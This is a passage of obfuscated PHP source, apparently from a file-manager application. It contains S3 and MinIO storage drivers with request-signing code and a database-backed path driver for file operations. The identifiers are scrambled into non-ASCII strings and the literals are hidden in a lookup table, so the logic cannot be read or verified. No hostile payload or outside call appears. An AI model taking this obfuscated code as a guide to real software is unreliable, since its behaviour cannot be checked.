$Î ·Ã¡©, $¹èÆŠñá[279] => $æÍ­ÁÊº, $¹èÆŠñá[273] => $øÚ÷Ë÷, $¹èÆŠñá[274] => $µâÕ¬ş, $¹èÆŠñá[275] => $¿Šîø•‰, $¹èÆŠñá[276] => $ˆµ®Ì£¸, $¹èÆŠñá[280] => $ÇÉ“Û¤¼, $¹èÆŠñá[258] => $¹èÆŠñá[249], $¹èÆŠñá[208] => $this->getHost()); if ($this->_isClientAsync()) { unset($•í¬¥Ğ[$¹èÆŠñá[258]]); } return $•í¬¥Ğ; } public function uploadMultiData($â‘È×®ö, $şÚşÏæï = 3600) { $ÇÉ‘¦¸ú =& $_SERVER[¼’ç§¼´]; $¼¿ï‹‚¨ = $this->signVer == $ÇÉ‘¦¸ú[249] ? gmdate($ÇÉ‘¦¸ú[281]) : gmdate($ÇÉ‘¦¸ú[282]); $±ÓëÜ¼ = array(); $•ÏÀÅ¡ = $this->client->getUploadId($this->bucket, $â‘È×®ö, $±ÓëÜ¼); if (!$•ÏÀÅ¡) { return !1; } $ËÜñ¯é = array($ÇÉ‘¦¸ú[283] => $•ÏÀÅ¡, $ÇÉ‘¦¸ú[208] => $this->getHost() . $ÇÉ‘¦¸ú[8] . $this->pathEncode($â‘È×®ö), $ÇÉ‘¦¸ú[284] => $¼¿ï‹‚¨, $ÇÉ‘¦¸ú[97] => $â‘È×®ö, $ÇÉ‘¦¸ú[258] => $this->signVer); if ($this->_isClientAsync()) { unset($ËÜñ¯é[$ÇÉ‘¦¸ú[258]]); } return $ËÜñ¯é; } public function uploadMultiAuth($–ÎÀ÷‡µ, $©µ¦ÎÂ = array()) { $ì©ü¿ö =& $_SERVER[¼’ç§¼´]; if ($this->signVer == $ì©ü¿ö[249]) { if (isset($©µ¦ÎÂ[$ì©ü¿ö[285]])) { return $this->uploadPartAuthV2($–ÎÀ÷‡µ, $©µ¦ÎÂ); } return $this->uploadListAuthV2($–ÎÀ÷‡µ, $©µ¦ÎÂ); } if (isset($©µ¦ÎÂ[$ì©ü¿ö[285]])) { return $this->uploadPartAuthV4($–ÎÀ÷‡µ, $©µ¦ÎÂ); } return $this->uploadListAuthV4($–ÎÀ÷‡µ, $©µ¦ÎÂ); } public function uploadPartAuthV2($ùº”¬ì, $¾à¨ ¨¨ = array()) { $‘õ‚áõÈ =& $_SERVER[¼’ç§¼´]; $Îöö’ìÀ = $¾à¨ ¨¨[$‘õ‚áõÈ[97]]; $€Ê°®• = gmdate($‘õ‚áõÈ[281]); $ŠæõÍ· = array_intersect_key($¾à¨ ¨¨, array_flip(array($‘õ‚áõÈ[285], $‘õ‚áõÈ[283]))); ksort($ŠæõÍ·); $Ò‘ıÑéŠ = $ŠæõÍ· ? $‘õ‚áõÈ[76] . http_build_query($ŠæõÍ·, null, $‘õ‚áõÈ[286], PHP_QUERY_RFC3986) : $‘õ‚áõÈ[12]; $ä…‘È = array($‘õ‚áõÈ[255], $‘õ‚áõÈ[12], $‘õ‚áõÈ[123], $‘õ‚áõÈ[12], "\x78\x2d\141\x6d\x7a\55\x64\141\x74\145\72{$€Ê°®•}", $‘õ‚áõÈ[8] . $this->bucket . $‘õ‚áõÈ[8] . $this->pathEncode($Îöö’ìÀ) . $Ò‘ıÑéŠ); $­ºãÒ‘ = implode($‘õ‚áõÈ[287], $ä…‘È); $©ĞéÉš¢ = $this->client->__getSignature($­ºãÒ‘); return array($‘õ‚áõÈ[288] => $©ĞéÉš¢, $‘õ‚áõÈ[284] => $€Ê°®•); } public function uploadListAuthV2($ÕäÇ°àÎ, $õìá†• = array()) { $é„§šÏ =& $_SERVER[¼’ç§¼´]; $Ü”³÷ ¦ = $õìá†•[$é„§šÏ[97]]; $±ÑÔé« = $õìá†•[$é„§šÏ[283]]; $Ã¤ „¥ğ = $this->client->listParts($this->bucket, $Ü”³÷ ¦, $±ÑÔé«); if (!$Ã¤ „¥ğ) { return !1; } $·¡¢ŞŠ¼ = gmdate($é„§šÏ[281]); $©ÃÊİ›¯ = $é„§šÏ[289] . $±ÑÔé«; $·€­Šáø = array($é„§šÏ[290], $é„§šÏ[12], $é„§šÏ[123], $é„§šÏ[12], "\170\55\141\155\172\x2d\x64\x61\164\x65\72{$·¡¢ŞŠ¼}", $é„§šÏ[8] . $this->bucket . $é„§šÏ[8] . $this->pathEncode($Ü”³÷ ¦) . $©ÃÊİ›¯); $ÇãÓüĞ¿ = implode($é„§šÏ[287], $·€­Šáø); $òŸÚª“ = $this->client->__getSignature($ÇãÓüĞ¿); return array($é„§šÏ[288] => $òŸÚª“, $é„§šÏ[284] => $·¡¢ŞŠ¼, $é„§šÏ[291] => $Ã¤ „¥ğ); } public function uploadPartAuthV4($úâ¸éú‹, $¶€ÖğÏ‹ = array()) { $ë¥„ì× =& $_SERVER[¼’ç§¼´]; $í¬Ÿ÷£Ñ = $¶€ÖğÏ‹[$ë¥„ì×[97]]; $³–Èµ£ä = array($ë¥„ì×[275] => gmdate($ë¥„ì×[282]), $ë¥„ì×[292] => _get($¶€ÖğÏ‹, $ë¥„ì×[293], hash($ë¥„ì×[277], $ë¥„ì×[12]))); $¥ÖÂˆÊ¸ = explode($ë¥„ì×[210], $this->getHost()); $Õ´–ÂœÍ = array($ë¥„ì×[294] => $¥ÖÂˆÊ¸[1], $ë¥„ì×[295] => $ë¥„ì×[12], $ë¥„ì×[248] => $ë¥„ì×[123], $ë¥„ì×[296] => $¶€ÖğÏ‹[$ë¥„ì×[79]]); $•ƒ»½øÀ = $ë¥„ì×[255]; $¯êçô = $ë¥„ì×[8] . $this->pathEncode($í¬Ÿ÷£Ñ); $ñúëú‰Ñ = array_intersect_key($¶€ÖğÏ‹, array_flip(array($ë¥„ì×[285], $ë¥„ì×[283]))); $ê¬™ûåÈ = $this->client->__getSignatureV4($³–Èµ£ä, $Õ´–ÂœÍ, $•ƒ»½øÀ, $¯êçô, $ñúëú‰Ñ); return array($ë¥„ì×[288] => $ê¬™ûåÈ, $ë¥„ì×[292] => $³–Èµ£ä[$ë¥„ì×[292]], $ë¥„ì×[284] => $³–Èµ£ä[$ë¥„ì×[275]]); } public function uploadListAuthV4($ìôßÊÌ¸, $«›‘ÒÆ¥ = array()) { $“ÌÌ´æ =& $_SERVER[¼’ç§¼´]; $©ù›‹Øò = $«›‘ÒÆ¥[$“ÌÌ´æ[97]]; $Ú¨Ë¹°Ö = $«›‘ÒÆ¥[$“ÌÌ´æ[283]]; $Ï‚±±ö = $this->client->listParts($this->bucket, $©ù›‹Øò, $Ú¨Ë¹°Ö); if (!$Ï‚±±ö) { return !1; } $Åõñ™§‰ = $“ÌÌ´æ[297]; foreach ($Ï‚±±ö as $¨£Âõô) { $Åõñ™§‰ .= $“ÌÌ´æ[298] . "\x3c\x50\141\x72\x74\x4e\165\x6d\x62\x65\x72\76{$¨£Âõô[$“ÌÌ´æ[299]]}\74\x2f\120\x61\162\164\x4e\x75\155\x62\145\162\x3e\12" . "\74\105\x54\141\147\76{$¨£Âõô[$“ÌÌ´æ[300]]}\x3c\x2f\105\x54\141\147\x3e\12" . $“ÌÌ´æ[301]; } $Åõñ™§‰ .= $“ÌÌ´æ[302]; $Ü”ßë³ = array($“ÌÌ´æ[275] => gmdate($“ÌÌ´æ[282]), $“ÌÌ´æ[292] => hash($“ÌÌ´æ[277], $Åõñ™§‰)); $•ÖÂÕÉø = explode($“ÌÌ´æ[210], $this->getHost()); $ã¨Æ»ª‡ = array($“ÌÌ´æ[294] => $•ÖÂÕÉø[1], $“ÌÌ´æ[248] => $“ÌÌ´æ[123], $“ÌÌ´æ[296] => strlen($Åõñ™§‰)); $’–Ù÷ûŞ = $“ÌÌ´æ[290]; $ÚÄŒ¸Ñ = $“ÌÌ´æ[8] . $this->pathEncode($©ù›‹Øò); $ãùü•ËÏ = array($“ÌÌ´æ[283] => $Ú¨Ë¹°Ö); $íÑ‘òÔ = $this->client->__getSignatureV4($Ü”ßë³, $ã¨Æ»ª‡, $’–Ù÷ûŞ, $ÚÄŒ¸Ñ, $ãùü•ËÏ); return array($“ÌÌ´æ[288] => $íÑ‘òÔ, $“ÌÌ´æ[292] => $Ü”ßë³[$“ÌÌ´æ[292]], $“ÌÌ´æ[284] => $Ü”ßë³[$“ÌÌ´æ[275]], $“ÌÌ´æ[291] => $Ï‚±±ö); } private function _isClientAsync() { $ëí¡ÕÖ© =& $_SERVER[¼’ç§¼´]; static $òû§ÈÏ = null; if ($òû§ÈÏ === null) { $Ö’¨û”Ó = isset($_REQUEST[$ëí¡ÕÖ©[303]]) ? json_decode($_REQUEST[$ëí¡ÕÖ©[303]], !0) : !1; $òû§ÈÏ = $Ö’¨û”Ó && _get($Ö’¨û”Ó, $ëí¡ÕÖ©[304]) == $ëí¡ÕÖ©[305]; } return $òû§ÈÏ; } public function getHost() { $Ç„¾¢Á› =& $_SERVER[¼’ç§¼´]; $ìÉ„éëş = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($Ç„¾¢Á›[70], $Ç„¾¢Á›[64], $Ç„¾¢Á›[69], $Ç„¾¢Á›[62]))) { return $ìÉ„éëş . $Ç„¾¢Á›[8] . $this->bucket; } if ($this->osType == $Ç„¾¢Á›[62] && !is_domain($ìÉ„éëş)) { return $ìÉ„éëş . $Ç„¾¢Á›[8] . $this->bucket; } $ìÉ„éëş = explode($Ç„¾¢Á›[210], $ìÉ„éëş); return $ìÉ„éëş[0] . $Ç„¾¢Á›[210] . $this->bucket . $Ç„¾¢Á›[10] . $ìÉ„éëş[1]; } public function size($÷ˆÔÌŸ¤) { $ˆµ×Á®ş = $this->objectMeta($÷ˆÔÌŸ¤); return $ˆµ×Á®ş ? $ˆµ×Á®ş[$_SERVER[¼’ç§¼´][79]] : 0; } public function info($Éš’–€­) { if ($this->isFolder($Éš’–€­)) { return $this->folderInfo($Éš’–€­); } else { if ($this->isFile($Éš’–€­)) { return $this->fileInfo($Éš’–€­); } } return !1; } public function exist($ÈÍùÑ´Ø) { return $this->isFile($ÈÍùÑ´Ø) || $this->isFolder($ÈÍùÑ´Ø); } public function isFile($ñ˜İÀüŸ) { return !$this->isFolder($ñ˜İÀüŸ) && $this->objectMeta($ñ˜İÀüŸ); } public function isFolder($Û˜ÍâÍ) { return $this->cacheMethod($_SERVER[¼’ç§¼´][179], $Û˜ÍâÍ); } protected function objectMeta($­É»—½®) { return $this->cacheMethod($_SERVER[¼’ç§¼´][181], $­É»—½®); } protected function _objectMeta($åìüí—Û) { $¦­Ìéï— =& $_SERVER[¼’ç§¼´]; $åìüí—Û = rtrim($åìüí—Û, $¦­Ìéï—[8]); try { $Ÿ™ıÀÉ = $this->client->getObjectInfo($this->bucket, $åìüí—Û); if (!isset($Ÿ™ıÀÉ[$¦­Ìéï—[254]]) && isset($Ÿ™ıÀÉ[$¦­Ìéï—[306]])) { $Ÿ™ıÀÉ[$¦­Ìéï—[254]] = $Ÿ™ıÀÉ[$¦­Ìéï—[306]]; } } catch (Exception $Â¥Éè•Ä) { $Ÿ™ıÀÉ = !1; } if (!$Ÿ™ıÀÉ) { } return $Ÿ™ıÀÉ; } protected function _isFolder($õ¿ŸìÑ³) { $üù‰È¸ª =& $_SERVER[¼’ç§¼´]; $õ¿ŸìÑ³ = rtrim($õ¿ŸìÑ³, $üù‰È¸ª[8]) . $üù‰È¸ª[8]; if ($õ¿ŸìÑ³ == $üù‰È¸ª[12] || $õ¿ŸìÑ³ == $üù‰È¸ª[8]) { return !0; } $Šù•ı½ã = $this->client->getBucket($this->bucket, $õ¿ŸìÑ³, null, 1); if (empty($Šù•ı½ã[$üù‰È¸ª[238]])) { return !1; } $Èùûú°” = $Šù•ı½ã[$üù‰È¸ª[238]][0][$üù‰È¸ª[32]]; return stripos($Èùûú°”, $õ¿ŸìÑ³) === 0 ? !0 : !1; if (substr($Èùûú°”, -1) == $üù‰È¸ª[8]) { return !0; } if (get_path_this($Èùûú°”) == get_path_this($õ¿ŸìÑ³)) { return !1; } return !0; } public function listObject($×ğ¦†¤) { return $this->fileList($×ğ¦†¤, $_SERVER[¼’ç§¼´][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($­ğ ğ¶ï) { $Ì¹“¤µ¡ =& $_SERVER[¼’ç§¼´]; parent::__construct($­ğ ğ¶ï); $this->setSignVersion($Ì¹“¤µ¡[249]); if (!$this->region) { $this->region = $Ì¹“¤µ¡[307]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ˆÑ³ø»Õ = $this->getBktRegion(); return $this->region == $ˆÑ³ø»Õ ? !0 : !1; } public function uploadFormData($ëÑÄ¦÷å, $¶ı£¼Ù’ = 3600) { $ÅáÓ†¹¦ =& $_SERVER[¼’ç§¼´]; $Ü·ÉˆŞû = $ÅáÓ†¹¦[231]; $’©¼©§¬ = $ÅáÓ†¹¦[259]; $ÍÜ¯•ÉÊ = $ÅáÓ†¹¦[62]; $â¸˜şøÙ = gmdate($ÅáÓ†¹¦[260]); $àùè¹­¾ = gmdate($ÅáÓ†¹¦[261]); $šå§²İ = $ÅáÓ†¹¦[262]; $äåÑÃˆ = $¶ı£¼Ù’ . $ÅáÓ†¹¦[12]; $ï€Ûéô– = $ÅáÓ†¹¦[263]; $ü´ƒâû = array($this->accessKey, $àùè¹­¾, $this->region, $ÍÜ¯•ÉÊ, $šå§²İ); $îÑËÌÀ° = implode($ÅáÓ†¹¦[8], $ü´ƒâû); $©±¯´» = array($ÅáÓ†¹¦[264] => gmdate($ÅáÓ†¹¦[265], strtotime($ÅáÓ†¹¦[266])), $ÅáÓ†¹¦[267] => array(array($ÅáÓ†¹¦[268] => $this->bucket), array($ÅáÓ†¹¦[308] => $Ü·ÉˆŞû), array($ÅáÓ†¹¦[269], $ÅáÓ†¹¦[270], $ÅáÓ†¹¦[12]), array($ÅáÓ†¹¦[269], $ÅáÓ†¹¦[271], $ÅáÓ†¹¦[12]), array($ÅáÓ†¹¦[269], $ÅáÓ†¹¦[309], $ÅáÓ†¹¦[12]), array($ÅáÓ†¹¦[272] => $ï€Ûéô–), array($ÅáÓ†¹¦[273] => $îÑËÌÀ°), array($ÅáÓ†¹¦[274] => $’©¼©§¬), array($ÅáÓ†¹¦[275] => $â¸˜şøÙ), array($ÅáÓ†¹¦[276] => $äåÑÃˆ))); $­ê¬ÅÆ = base64_encode(json_encode($©±¯´»)); $¼—…œâ¾ = hash_hmac($ÅáÓ†¹¦[277], $àùè¹­¾, $ÅáÓ†¹¦[278] . $this->secret, !0); $ı«‚¢¨“ = hash_hmac($ÅáÓ†¹¦[277], $this->region, $¼—…œâ¾, !0); $ÑÜğã = hash_hmac($ÅáÓ†¹¦[277], $ÍÜ¯•ÉÊ, $ı«‚¢¨“, !0); $Ç…­Ó•ò = hash_hmac($ÅáÓ†¹¦[277], $šå§²İ, $ÑÜğã, !0); $ ·Ğßè§ = hash_hmac($ÅáÓ†¹¦[277], $­ê¬ÅÆ, $Ç…­Ó•ò); $Æ¤¨úÀµ = array($ÅáÓ†¹¦[248] => $ÅáÓ†¹¦[12], $ÅáÓ†¹¦[296] => $ÅáÓ†¹¦[12], $ÅáÓ†¹¦[308] => $Ü·ÉˆŞû, $ÅáÓ†¹¦[272] => $ï€Ûéô–, $ÅáÓ†¹¦[279] => $­ê¬ÅÆ, $ÅáÓ†¹¦[310] => $îÑËÌÀ°, $ÅáÓ†¹¦[311] => $’©¼©§¬, $ÅáÓ†¹¦[312] => $â¸˜şøÙ, $ÅáÓ†¹¦[313] => $äåÑÃˆ, $ÅáÓ†¹¦[314] => $ ·Ğßè§, $ÅáÓ†¹¦[208] => $this->getHost()); return $Æ¤¨úÀµ; } } goto cî±óõÜ—ò; F·ÏÑª…ß: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($â­º˜âª) { $this->pathParse = $â­º˜âª; $this->model = Model($_SERVER[¼’ç§¼´][1430]); } public function getPath($…ÎªÛ¢°) { return trim($…ÎªÛ¢°, $_SERVER[¼’ç§¼´][8]); } public function pathFather($¾»¥¬ùŠ) { $ş õÈàÛ = $this->parse($¾»¥¬ùŠ); $ş õÈàÛ = $this->infoSimple($¾»¥¬ùŠ); return $ş õÈàÛ ? $ş õÈàÛ[$_SERVER[¼’ç§¼´][192]] : !1; } public function pathThis($šƒ¦Ç’) { $Š³Í’ì£ = $this->infoSimple($šƒ¦Ç’); return $Š³Í’ì£ ? $Š³Í’ì£[$_SERVER[¼’ç§¼´][32]] : !1; } public function getPathOuter($Äªæäà) { if (!$Äªæäà) { return $Äªæäà; } $¦«Û¤Ô¥ = $this->parse($Äªæäà); return KodIO::make($¦«Û¤Ô¥[$_SERVER[¼’ç§¼´][486]]); } public function copyFolderFromIO($¿ç¾û¸ª, $ùá°°ÁÎ, $µŒ—É±, $™£ï•ñÚ, $‹Ÿ¬¨—½) { $·ŠúÅû¬ = $this->model->copyFolderFromIO($¿ç¾û¸ª, $ùá°°ÁÎ, $µŒ—É±, $™£ï•ñÚ, $‹Ÿ¬¨—½); return KodIO::make($·ŠúÅû¬); } public function isParentOf($’Å™ ­ı, $µ™…¢äÎ) { return $this->model->isParentOf($’Å™ ­ı, $µ™…¢äÎ); } public function mkfile($ÜĞæ€è—, $Îô²Ï = '', $Ï³û§Ïû = REPEAT_RENAME) { $Ïò«é÷½ =& $_SERVER[¼’ç§¼´]; $­ğ¾Ú´ô = $this->parse($ÜĞæ€è—); $ÜĞæ€è— = $­ğ¾Ú´ô[$Ïò«é÷½[486]]; for ($Òç‰º§û = 0; $Òç‰º§û < count($­ğ¾Ú´ô[$Ïò«é÷½[1431]]); $Òç‰º§û++) { $ Èµíå¢ = $­ğ¾Ú´ô[$Ïò«é÷½[1431]][$Òç‰º§û]; if ($Òç‰º§û == count($­ğ¾Ú´ô[$Ïò«é÷½[1431]]) - 1) { $ÜĞæ€è— = $this->model->mkfile($ÜĞæ€è—, $ Èµíå¢, $Îô²Ï, $Ï³û§Ïû); break; } $ÜĞæ€è— = $this->model->mkdir($ÜĞæ€è—, $ Èµíå¢, REPEAT_SKIP); } return $this->getPathOuter($ÜĞæ€è—); } public function mkdir($»–Ó‹¥, $¥ãÙ°±ş = REPEAT_SKIP) { $æÛ·Üñ² =& $_SERVER[¼’ç§¼´]; $‹†ê–Ü = $this->parse($»–Ó‹¥); $»–Ó‹¥ = $‹†ê–Ü[$æÛ·Üñ²[486]]; for ($¬é¬Îõ© = 0; $¬é¬Îõ© < count($‹†ê–Ü[$æÛ·Üñ²[1431]]); $¬é¬Îõ©++) { $¾¸íâàş = $‹†ê–Ü[$æÛ·Üñ²[1431]][$¬é¬Îõ©]; $»–Ó‹¥ = $this->model->mkdir($»–Ó‹¥, $¾¸íâàş, $¥ãÙ°±ş); } return $this->getPathOuter($»–Ó‹¥); } public function copyFile($šÅŒòİÔ, $¬…«¥÷é, $Õ„í‡Š° = REPEAT_REPLACE) { $Õäæ‘Ü =& $_SERVER[¼’ç§¼´]; $ìîÈÄÑó = $this->parse($¬…«¥÷é); $ó«ÔâÅ• = $this->model->copy($šÅŒòİÔ, $ìîÈÄÑó[$Õäæ‘Ü[486]], $Õ„í‡Š°, $ìîÈÄÑó[$Õäæ‘Ü[87]]); return $ó«ÔâÅ• ? $this->getPathOuter($ó«ÔâÅ•) : !1; } public function moveFile($ÍíÁø¼Ñ, $ÊĞ³ã‘¶, $çŞß§Ú = REPEAT_REPLACE) { $½©¸•Ïü =& $_SERVER[¼’ç§¼´]; $ûõšÍ‘“ = $this->parse($ÊĞ³ã‘¶); $şşî±›Ù = $this->model->move($ÍíÁø¼Ñ, $ûõšÍ‘“[$½©¸•Ïü[486]], $çŞß§Ú, $ûõšÍ‘“[$½©¸•Ïü[87]]); return $şşî±›Ù ? $this->getPathOuter($şşî±›Ù) : !1; } public function copy($ÃŞì®¡, $…î×ƒÜ£, $êÒ¥é… = REPEAT_REPLACE, $Ä›Ä¥ã× = false) { $å ¶¬Œ = $this->parse($…î×ƒÜ£); $–ĞŒ—¾‘ = $this->model->copy($ÃŞì®¡, $å ¶¬Œ[$_SERVER[¼’ç§¼´][486]], $êÒ¥é…, $Ä›Ä¥ã×); return $–ĞŒ—¾‘ ? $this->getPathOuter($–ĞŒ—¾‘) : !1; } public function moveSameAllow() { } public function move($ç„À££, $ôÏËõËÛ, $İ»ÚåÓ = REPEAT_REPLACE, $½ŒØíø¹ = false) { $ıªÈ¸ = $this->parse($ôÏËõËÛ); $œé‚øÜê = $this->model->move($ç„À££, $ıªÈ¸[$_SERVER[¼’ç§¼´][486]], $İ»ÚåÓ, $½ŒØíø¹); return $œé‚øÜê ? $this->getPathOuter($œé‚øÜê) : !1; } public function remove($µ÷’óÑÉ, $ˆĞ°¸Ëº = true) { return $this->model->remove($µ÷’óÑÉ, $ˆĞ°¸Ëº); } public function rename($¿ÏÆ§Œ”, $Ø•ÌÒğ®) { $şúõå¿ = $this->model->rename($¿ÏÆ§Œ”, $Ø•ÌÒğ®); return $şúõå¿ ? $this->getPathOuter($¿ÏÆ§Œ”) : $şúõå¿; } public function size($‹¾õ·Ÿõ) { $´é‰ïğÍ = $this->infoSimple($‹¾õ·Ÿõ); return $´é‰ïğÍ ? $´é‰ïğÍ[$_SERVER[¼’ç§¼´][79]] : 0; } public function infoSimple($Û–©ÅÂ‰) { return $this->model->sourceInfo($Û–©ÅÂ‰); } public function info($åè¡àˆü) { return $this->infoParse($åè¡àˆü); } public function infoAuth($¦ÑşñÅù) { return $this->infoParse($¦ÑşñÅù, !1, !0); } public function infoWithChildren($§ëµ•ôÉ) { return $this->infoParse($§ëµ•ôÉ, !0); } protected function infoParse($‰§Ğà±Û, $õ›º“Ó¼ = false, $ò€Çğºœ = false) { if (!$õ›º“Ó¼) { return $this->model->pathInfo($‰§Ğà±Û, $ò€Çğºœ); } return $this->model->pathInfoMore($‰§Ğà±Û); } public function infoFullSimple($§äõäêÂ) { $¬€¾¤ı =& $_SERVER[¼’ç§¼´]; $÷äŒ’è = explode($¬€¾¤ı[8], $§äõäêÂ); $à‡á©À = implode($¬€¾¤ı[8], array_splice($÷äŒ’è, 1)); return $this->model->pathInfoByPath($÷äŒ’è[0], $à‡á©À); } public function infoFull($î¬ˆò«) { $÷Ä¾·´ = $this->infoFullSimple($î¬ˆò«); return is_array($÷Ä¾·´) ? $this->model->pathInfo($÷Ä¾·´[$_SERVER[¼’ç§¼´][193]]) : !1; } public function hashSimple($ç•…çª’) { $¿ê¿÷—ë =& $_SERVER[¼’ç§¼´]; $ÛÉ„ùŠ¼ = $this->infoWithChildren($ç•…çª’); return $ÛÉ„ùŠ¼[$¿ê¿÷—ë[170]][$¿ê¿÷—ë[686]]; } public function hashMd5($”š£—Èö) { $¨§¿”ª =& $_SERVER[¼’ç§¼´]; $“ùÊ· = $this->infoWithChildren($”š£—Èö); return $“ùÊ·[$¨§¿”ª[170]][$¨§¿”ª[558]]; } public function exist($ôü²÷ÛÉ) { $êæ¯½ƒÌ =& $_SERVER[¼’ç§¼´]; $ˆÖßç¤í = $this->parse($ôü²÷ÛÉ); if (!$ˆÖßç¤í[$êæ¯½ƒÌ[87]]) { return $this->isFile($ôü²÷ÛÉ) || $this->isFolder($ôü²÷ÛÉ); } $ŞÉ‘°Îó = array($êæ¯½ƒÌ[488] => $ˆÖßç¤í[$êæ¯½ƒÌ[486]], $êæ¯½ƒÌ[32] => $ˆÖßç¤í[$êæ¯½ƒÌ[87]]); $¥„ÍííÁ = $this->model->where($ŞÉ‘°Îó)->find(); return $¥„ÍííÁ ? !0 : !1; } public function isFile($îÖ¡±Úì) { $–™Ïâß– =& $_SERVER[¼’ç§¼´]; $ß§ºÇŒÆ = $this->infoSimple($îÖ¡±Úì); return $ß§ºÇŒÆ && $ß§ºÇŒÆ[$–™Ïâß–[496]] == $–™Ïâß–[230] ? !0 : !1; } public function isFolder($üç®œ÷) { $¸Ò„­ğÍ =& $_SERVER[¼’ç§¼´]; $µ–ö¦† = $this->infoSimple($üç®œ÷); return $µ–ö¦† && $µ–ö¦†[$¸Ò„­ğÍ[496]] == $¸Ò„­ğÍ[91] ? !0 : !1; } public function listPath($±ËÑÓè±, $–Õü¹¼š = false) { $Í£…´– =& $_SERVER[¼’ç§¼´]; if ($±ËÑÓè± == $Í£…´–[12]) { return !1; } $¹Ô·ÑÜ = array($Í£…´–[488] => $±ËÑÓè±); if ($–Õü¹¼š) { return $this->model->listSource($¹Ô·ÑÜ, -1); } return $this->model->listSource($¹Ô·ÑÜ); } public function has($éé‘ıà, $¯ö’¢ªğ = false, $ù»«ç‹Ì = null) { $ÎøÛÀœ =& $_SERVER[¼’ç§¼´]; $©Êğ¨ÁÂ = $this->infoWithChildren($éé‘ıà); if ($¯ö’¢ªğ) { return array($ÎøÛÀœ[242] => $©Êğ¨ÁÂ[$ÎøÛÀœ[242]], $ÎøÛÀœ[241] => $©Êğ¨ÁÂ[$ÎøÛÀœ[241]]); } return $ù»«ç‹Ì ? $©Êğ¨ÁÂ[$ÎøÛÀœ[242]] : $©Êğ¨ÁÂ[$ÎøÛÀœ[241]]; } public function listAll($ºäËïö½) { $ëŠ…úäú = IO::info($this->pathParse[$_SERVER[¼’ç§¼´][87]]); if (!$ëŠ…úäú) { return array(); } return $this->model->listAll($ºäËïö½); } public function getContent($“´‘½¹±) { return $this->model->getContent($“´‘½¹±); } public function setContent($ˆ“¢€Ë, $²“çşû = '') { return $this->model->setContent($ˆ“¢€Ë, $²“çşû); } public function fileSubstr($õû…óÏƒ, $Î¼—³èÓ, $Ä¶óœÜ) { return $this->model->fileSubstr($õû…óÏƒ, $Î¼—³èÓ, $Ä¶óœÜ); } public function download($ÍÊ¨™­, $…çøˆÓÙ = '') { $è¢ºõÃ½ = get_path_father($…çøˆÓÙ); $ö…ÌÓõÓ = get_path_this($…çøˆÓÙ); $€Î¥µ¤ = $this->model->fileInfoGet($ÍÊ¨™­); $¼†óÔ·Á = IO::copy($€Î¥µ¤[$_SERVER[¼’ç§¼´][87]], $è¢ºõÃ½, !1, $ö…ÌÓõÓ); return $¼†óÔ·Á; } public function setModifyTime($½ÇÅÒ§, $“œ¤³ÌÚ = '') { $ÚçèÉº‰ =& $_SERVER[¼’ç§¼´]; if (!$½ÇÅÒ§) { return; } $this->model->where(array($ÚçèÉº‰[502] => $½ÇÅÒ§))->save(array($ÚçèÉº‰[88] => $“œ¤³ÌÚ)); } public function upload($ìŞŞœ€Ê, $ŠüŒ„ÜÃ, $´Ï¸ş§Ç = false, $áÄ‚ïâ‘ = REPEAT_REPLACE) { $ƒ’‰„Äá =& $_SERVER[¼’ç§¼´]; $ŞµÒô«è = $this->parse($ìŞŞœ€Ê); $óÍ³Ğ§ = $this->model->addFile($ŞµÒô«è[$ƒ’‰„Äá[486]], $ŠüŒ„ÜÃ, $ŞµÒô«è[$ƒ’‰„Äá[87]], $´Ï¸ş§Ç, $áÄ‚ïâ‘); return $this->getPathOuter($óÍ³Ğ§); } public function uploadFileByID($ˆÊñ•Úµ, $Á¨©Ãô£, $ÌØã×Òı) { $ËâÅŞ…Ğ =& $_SERVER[¼’ç§¼´]; $²ƒ¾ÏÏ¿ = $this->parse($ˆÊñ•Úµ); $†¸É¯ƒ = $this->model->addFileByFileID($²ƒ¾ÏÏ¿[$ËâÅŞ…Ğ[486]], $Á¨©Ãô£, $²ƒ¾ÏÏ¿[$ËâÅŞ…Ğ[87]], $ÌØã×Òı); return $this->getPathOuter($†¸É¯ƒ); } public function addFileByRemote($¼ÈÀŸİ, $Áµ¯ú‰å, $ÊñšŸĞ = array(), $ÔŸ‡Èä = '', $ßÓ—»ö–) { $êĞÚ‹² =& $_SERVER[¼’ç§¼´]; $Ü•²óÔÖ = $this->parse($¼ÈÀŸİ); $ÔŸ‡Èä = empty($ÔŸ‡Èä) ? $Ü•²óÔÖ[$êĞÚ‹²[87]] : $ÔŸ‡Èä; $øôòÙú– = $this->model->addFileByRemote($Ü•²óÔÖ[$êĞÚ‹²[486]], $Áµ¯ú‰å, $ÔŸ‡Èä, $ÊñšŸĞ, $ßÓ—»ö–); return $this->getPathOuter($øôòÙú–); } public function uploadLink($®šßßÚ, $òô³ºã€ = 0) { $¦¿ûÆ›Ğ =& $_SERVER[¼’ç§¼´]; $ì½­ß÷› = $this->parse($®šßßÚ); $Õ‘êÍú = _get($GLOBALS[$¦¿ûÆ›Ğ[7]], $¦¿ûÆ›Ğ[1432]); $¿‡“¿Ô¯ = _get($GLOBALS[$¦¿ûÆ›Ğ[7]], $¦¿ûÆ›Ğ[1433]); $®šßßÚ = Model($¦¿ûÆ›Ğ[688])->createFileName($ì½­ß÷›[$¦¿ûÆ›Ğ[87]], $Õ‘êÍú, $¿‡“¿Ô¯); return IO::uploadLink($®šßßÚ, $òô³ºã€); } public function fileNameAuto($¦âèªŞ¥, $ŒŸÄôéİ, $ºˆ‰á­­ = REPEAT_REPLACE, $•ÁÃ’é½ = false) { return $this->model->fileNameAuto($¦âèªŞ¥, $ŒŸÄôéİ, $ºˆ‰á­­, $•ÁÃ’é½); } public function fileNameExist($¾É™™ç™, $ıñ­šÉ‡) { return $this->model->fileNameExist($¾É™™ç™, $ıñ­šÉ‡); } protected function _fileOut($éËº®Ã, $¡åË‹¼á = false, $ÀÄ°ğ–ı = false, $Ô¿³ÏÏÔ = '', $ÄçÖ¥ºó = false) { $Ö—ÁÃ­Ñ =& $_SERVER[¼’ç§¼´]; $´ßË´¿¶ = $this->model->sourceInfo($éËº®Ã); if ($´ßË´¿¶[$Ö—ÁÃ­Ñ[496]] == $Ö—ÁÃ­Ñ[91]) { header($Ö—ÁÃ­Ñ[1434]); die; } 